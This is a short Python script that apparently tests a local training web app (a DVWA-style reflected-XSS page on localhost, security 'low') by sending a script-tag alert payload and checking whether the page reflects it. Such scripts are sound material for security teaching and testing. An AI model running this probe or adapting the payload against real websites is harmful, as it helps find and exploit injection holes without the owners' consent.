import requests

url = 'http://localhost:8080/vulnerabilities/xss_r/'
cookies = {
    'PHPSESSID': 'u6b6d75vrp01r26fgd20040i95',
    'security': 'low'
}

payload = "<script>alert('XSS was here');</script>"
params = {'name': payload, 'Submit': 'Submit'}

response = requests.get(url, params=params, cookies=cookies)

print(f"[i] Testing with payload: {payload}")

if payload in response.text:
    print("[+] Success: Reflected XSS vulnerability exists!")
else:
    print("[-] Failure: Reflected XSS not detected.")
